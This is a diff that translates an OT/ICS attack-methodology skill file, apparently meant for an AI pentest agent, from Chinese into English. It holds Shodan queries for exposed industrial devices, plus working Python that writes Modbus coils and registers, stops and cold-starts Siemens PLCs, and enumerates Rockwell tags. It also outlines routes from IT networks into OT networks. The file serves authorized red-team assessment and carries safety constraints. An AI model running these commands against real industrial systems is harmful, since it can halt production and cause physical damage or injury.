@@ -1,98 +1,103 @@
 ---
 name: ot-ics-attack
-description: "OT/ICS 工控系统攻击方法论。当目标涉及 SCADA/DCS/PLC 系统、发现 Modbus/DNP3/OPC UA/EtherNet-IP 等工控协议、或需要评估关键基础设施安全时使用。覆盖工控协议利用、PLC 攻击、HMI 渗透、IT/OT 边界突破"
+description: "OT/ICS industrial control system attack methodology. Use when the target involves SCADA/DCS/PLC systems, when industrial protocols such as Modbus/DNP3/OPC UA/EtherNet-IP are found, or when critical infrastructure security must be assessed. Covers industrial protocol exploitation, PLC attacks, HMI penetration, and IT/OT boundary breach"
+zh-signals: "OT/ICS 工控系统攻击方法论，覆盖 SCADA/DCS/PLC、工控协议利用、HMI 渗透与 IT/OT 边界突破。信号:工控安全,SCADA,PLC,Modbus,OPC UA"
+when-to-use: >-
+  Use when the target involves SCADA/DCS/PLC systems, industrial protocols such as
+  Modbus/DNP3/OPC UA/EtherNet-IP, or assessing critical-infrastructure security in
+  an authorized, isolated environment.
 metadata:
-  tags: "ot,ics,scada,plc,modbus,dnp3,opc-ua,hmi,工控,工业控制,关键基础设施"
+  tags: "ot,ics,scada,plc,modbus,dnp3,opc-ua,hmi,industrial control,critical infrastructure"
   category: "exploit"
   mitre_attack: "T0800,T0801,T0802,T0803,T0831,T0855"
 ---
 
-# OT/ICS 工控系统攻击方法论
+# OT/ICS Industrial Control System Attack Methodology
 
-> **⛔ 安全警告**：OT 系统控制物理过程，错误操作可能导致设备损坏、环境灾难或人身伤害。仅在明确授权和安全隔离环境下测试！
+> **⛔ Safety warning**: OT systems control physical processes, and incorrect operations may cause equipment damage, environmental disaster, or personal injury. Test only in an explicitly authorized and safely isolated environment!
 
-## ⛔ 深入参考
+## ⛔ Further Reading
 
-- 工控协议利用详细 payload → [references/ics-protocol-exploit.md](references/ics-protocol-exploit.md)
-- PLC 攻击与固件分析 → [references/plc-attack.md](references/plc-attack.md)
+- Detailed industrial protocol exploitation payloads → [references/ics-protocol-exploit.md](references/ics-protocol-exploit.md)
+- PLC attacks and firmware analysis → [references/plc-attack.md](references/plc-attack.md)
 
 ---
 
-## Phase 0: OT 环境理解
+## Phase 0: Understanding the OT Environment
 
-### Purdue 模型（网络分层）
+### Purdue Model (Network Layers)
 
 ```
 Level 5: Enterprise Network (IT)
 Level 4: Business Planning (ERP/MES)
-━━━━━━━━━━━ DMZ / IT-OT 边界 ━━━━━━━━━━━
+━━━━━━━━━━━ DMZ / IT-OT boundary ━━━━━━━━━━━
 Level 3: Site Operations (Historian/SCADA Server)
 Level 2: Area Control (HMI/Engineering WS)
 Level 1: Basic Control (PLC/RTU/DCS)
-Level 0: Physical Process (传感器/执行器)
+Level 0: Physical Process (sensors/actuators)
 
-攻击路径通常: Level 5 → 4 → DMZ → 3 → 2 → 1 → 0
-关键突破点: IT/OT 边界（DMZ 配置错误）
+Typical attack path: Level 5 → 4 → DMZ → 3 → 2 → 1 → 0
+Key breach point: the IT/OT boundary (DMZ misconfiguration)
 ```
 
-### 常见工控协议
+### Common Industrial Protocols
 
-| 协议 | 端口 | 认证 | 用途 |
+| Protocol | Port | Authentication | Purpose |
 |------|------|------|------|
-| Modbus TCP | 502 | ⛔ 无 | PLC 读写寄存器 |
-| DNP3 | 20000 | 可选 | 电力 SCADA |
-| OPC UA | 4840 | 有 | 数据访问 |
-| EtherNet/IP | 44818 | ⛔ 无 | Rockwell PLC |
-| S7comm | 102 | ⛔ 无 | Siemens PLC |
-| BACnet | 47808 | ⛔ 无 | 楼宇自控 |
-| FINS | 9600 | ⛔ 无 | Omron PLC |
+| Modbus TCP | 502 | ⛔ None | Read/write PLC registers |
+| DNP3 | 20000 | Optional | Electric power SCADA |
+| OPC UA | 4840 | Yes | Data access |
+| EtherNet/IP | 44818 | ⛔ None | Rockwell PLC |
+| S7comm | 102 | ⛔ None | Siemens PLC |
+| BACnet | 47808 | ⛔ None | Building automation |
+| FINS | 9600 | ⛔ None | Omron PLC |
 
-## Phase 1: 信息收集（被动优先）
+## Phase 1: Information Gathering (Passive First)
 
 ```bash
-# Shodan 搜索暴露的 ICS 设备
+# Shodan search for exposed ICS devices
 shodan search "port:502 product:Modbus"
 shodan search "port:102 product:S7"
 shodan search "port:44818 product:EtherNet/IP"
 shodan search "port:47808 product:BACnet"
 
-# 目标网络扫描（⛔ 仅在授权后，使用低速率）
+# Scan the target network (⛔ only after authorization, use a low rate)
 nmap -sT -Pn -p 102,502,4840,20000,44818,47808 --scan-delay 500ms TARGET_RANGE
 
-# 被动流量分析（如果有镜像端口）
+# Passive traffic analysis (if a mirror port is available)
 tcpdump -i eth0 -w ics_traffic.pcap port 502 or port 102 or port 44818
 
-# Wireshark 工控协议解析
-# 内置支持: Modbus, DNP3, OPC UA, S7comm, EtherNet/IP
+# Wireshark industrial protocol parsing
+# Built-in support: Modbus, DNP3, OPC UA, S7comm, EtherNet/IP
 ```
 
-## Phase 2: 工控协议利用
+## Phase 2: Industrial Protocol Exploitation
 
-### 2.1 Modbus TCP（无认证！）
+### 2.1 Modbus TCP (No Authentication!)
 
 ```python
 #!/usr/bin/env python3
-"""Modbus TCP 读写操作 — 无需认证"""
+"""Modbus TCP read/write operations — no authentication required"""
 from pymodbus.client import ModbusTcpClient
 
 client = ModbusTcpClient('TARGET_IP', port=502)
 client.connect()
 
-# 读取保持寄存器（获取当前值/配置）
+# Read holding registers (get current values/configuration)
 result = client.read_holding_registers(address=0, count=10, slave=1)
 print(f"Registers: {result.registers}")
 
-# 读取线圈状态（数字输出状态）
+# Read coil status (digital output state)
 result = client.read_coils(address=0, count=10, slave=1)
 print(f"Coils: {result.bits}")
 
-# ⛔ 写入操作（改变物理过程！仅在安全环境）
-# 写单个寄存器
+# ⛔ Write operations (change the physical process! only in a safe environment)
+# Write a single register
 client.write_register(address=0, value=100, slave=1)
 
-# 写单个线圈（开关控制）
-client.write_coil(address=0, value=True, slave=1)  # 开
-client.write_coil(address=0, value=False, slave=1) # 关
+# Write a single coil (switch control)
+client.write_coil(address=0, value=True, slave=1)  # on
+client.write_coil(address=0, value=False, slave=1) # off
 
 client.close()
 ```
@@ -101,30 +106,30 @@ client.close()
 
 ```python
 #!/usr/bin/env python3
-"""S7comm 协议交互 — Siemens S7-300/400/1200/1500"""
+"""S7comm protocol interaction — Siemens S7-300/400/1200/1500"""
 import snap7
 
-# 连接 PLC
+# Connect to the PLC
 plc = snap7.client.Client()
 plc.connect('TARGET_IP', rack=0, slot=1)  # S7-300: slot=2
 
-# 读取 PLC 信息
+# Read PLC information
 info = plc.get_cpu_info()
 print(f"Module: {info.ModuleTypeName}")
 print(f"Serial: {info.SerialNumber}")
 
-# 读取数据块 (DB)
+# Read a data block (DB)
 data = plc.db_read(db_number=1, start=0, size=100)
 print(f"DB1 data: {data.hex()}")
 
-# 读取输入/输出
-inputs = plc.read_area(snap7.types.Areas.PE, 0, 0, 10)   # 输入
-outputs = plc.read_area(snap7.types.Areas.PA, 0, 0, 10)  # 输出
+# Read inputs/outputs
+inputs = plc.read_area(snap7.types.Areas.PE, 0, 0, 10)   # inputs
+outputs = plc.read_area(snap7.types.Areas.PA, 0, 0, 10)  # outputs
 
-# ⛔ 危险操作（仅安全环境）
-# 停止 PLC
+# ⛔ Dangerous operations (only in a safe environment)
+# Stop the PLC
 plc.plc_stop()
-# 启动 PLC
+# Start the PLC
 plc.plc_cold_start()
 
 plc.disconnect()
@@ -134,46 +139,46 @@ plc.disconnect()
 
 ```python
 #!/usr/bin/env python3
-"""EtherNet/IP CIP 协议 — 无认证"""
+"""EtherNet/IP CIP protocol — no authentication"""
 from pycomm3 import LogixDriver
 
 with LogixDriver('TARGET_IP') as plc:
-    # 读取标签值
+    # Read a tag value
     result = plc.read('MyTag')
     print(f"Tag value: {result.value}")
 
-    # 读取多个标签
+    # Read multiple tags
     results = plc.read('Tag1', 'Tag2', 'Tag3')
     for r in results:
         print(f"{r.tag}: {r.value}")
 
-    # 获取 PLC 信息
+    # Get PLC information
     info = plc.get_plc_info()
     print(f"Product: {info['product_name']}")
 
-    # 列出所有标签（信息收集）
+    # List all tags (information gathering)
     tags = plc.get_tag_list()
     for tag in tags:
         print(f"  {tag['tag_name']}: {tag['data_type_name']}")
 
-    # ⛔ 写入
+    # ⛔ Write
     # plc.write('MotorSpeed', 1000)
 ```
 
-## Phase 3: HMI/SCADA 服务器攻击
+## Phase 3: HMI/SCADA Server Attacks
 
 ```
-HMI/SCADA 常见漏洞：
-├─ 默认凭据（admin/admin, administrator/空）
-├─ 未加密通信（Modbus/OPC DA 明文）
-├─ Web HMI SQL注入/XSS
-├─ VNC 无密码暴露
-├─ RDP 弱口令（Level 2/3 工作站）
-├─ 过时操作系统（Windows XP/7/2008 仍在用）
-└─ 未更新的 SCADA 软件（已知 CVE）
+Common HMI/SCADA vulnerabilities:
+├─ Default credentials (admin/admin, administrator/empty)
+├─ Unencrypted communications (Modbus/OPC DA in plaintext)
+├─ Web HMI SQL injection/XSS
+├─ Exposed VNC without a password
+├─ Weak RDP credentials (Level 2/3 workstations)
+├─ Obsolete operating systems (Windows XP/7/2008 still in use)
+└─ Unpatched SCADA software (known CVEs)
 
-常见 SCADA 软件:
-├─ Siemens WinCC → CVE 众多
+Common SCADA software:
+├─ Siemens WinCC → numerous CVEs
 ├─ GE iFix / CIMPLICITY
 ├─ Schneider ClearSCADA
 ├─ Wonderware InTouch
@@ -181,46 +186,46 @@ HMI/SCADA 常见漏洞：
 └─ Kepware KEPServerEX (OPC)
 ```
 
-## Phase 4: IT/OT 边界突破
+## Phase 4: IT/OT Boundary Breach
 
 ```
-从 IT 网络进入 OT：
-├─ 跳板: Historian 服务器（同时连接 IT 和 OT）
-├─ 双网卡工作站（Level 3 操作员电脑）
-├─ VPN/远程访问通道（TeamViewer/AnyDesk 在 HMI 上）
-├─ 共享文件服务器（IT/OT 共享）
-├─ 数据库服务器（MES/ERP 连接到 OT）
-└─ 防火墙规则宽松（OT→IT 无限制回连）
+Entering the OT network from IT:
+├─ Pivot: Historian server (connected to both IT and OT)
+├─ Dual-NIC workstation (Level 3 operator computer)
+├─ VPN/remote access channels (TeamViewer/AnyDesk running on the HMI)
+├─ Shared file server (shared between IT and OT)
+├─ Database server (MES/ERP connected to OT)
+└─ Permissive firewall rules (unrestricted callback from OT to IT)
 ```
 
-## Phase 5: 攻击影响评估
+## Phase 5: Attack Impact Assessment
 
 ```
-⛔ OT 攻击的潜在物理影响：
-├─ 改变 PLC 逻辑 → 物理过程失控
-├─ 修改 HMI 显示 → 操作员看到假数据（Stuxnet 手法）
-├─ 停止 PLC → 生产停摆
-├─ 修改安全限值 → 越过安全阈值
-└─ 同时攻击 SIS(安全仪表系统) + PLC → 最危险
+Potential physical impact of an OT attack:
+├─ Change PLC logic → loss of control of the physical process
+├─ Modify HMI displays → operators see false data (the Stuxnet technique)
+├─ Stop the PLC → production shutdown
+├─ Modify safety limits → cross the safety thresholds
+└─ Attack the SIS (Safety Instrumented System) and the PLC at the same time → most dangerous
 
-红队测试中的安全约束：
-├─ ⛔ NEVER 修改 SIS (Safety Instrumented System)
-├─ ⛔ NEVER 在生产系统上测试写入操作
-├─ ✓ 仅读取操作验证可达性
-├─ ✓ 在独立测试环境中验证写入
-└─ ✓ 随时与运维团队保持通信
+Safety constraints during red team testing:
+├─ ⛔ NEVER modify the SIS (Safety Instrumented System)
+├─ ⛔ NEVER test write operations on production systems
+├─ ✓ Use read-only operations to verify reachability
+├─ ✓ Validate writes in an isolated test environment
+└─ ✓ Keep in constant communication with the operations team
 ```
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 |
+| Tool | Purpose |
 |------|------|
-| pymodbus | Modbus TCP 客户端 |
-| python-snap7 | Siemens S7 通信 |
+| pymodbus | Modbus TCP client |
+| python-snap7 | Siemens S7 communication |
 | pycomm3 | EtherNet/IP CIP |
-| Wireshark + ICS dissectors | 协议分析 |
-| PLCScan | PLC 枚举 |
-| ISF (Industrial Exploitation Framework) | ICS 利用框架 |
-| GRASSMARLIN | OT 网络拓扑发现 |
-| Shodan/Censys | 暴露面发现 |
+| Wireshark + ICS dissectors | Protocol analysis |
+| PLCScan | PLC enumeration |
+| ISF (Industrial Exploitation Framework) | ICS exploitation framework |
+| GRASSMARLIN | OT network topology discovery |
+| Shodan/Censys | Exposure discovery |
 
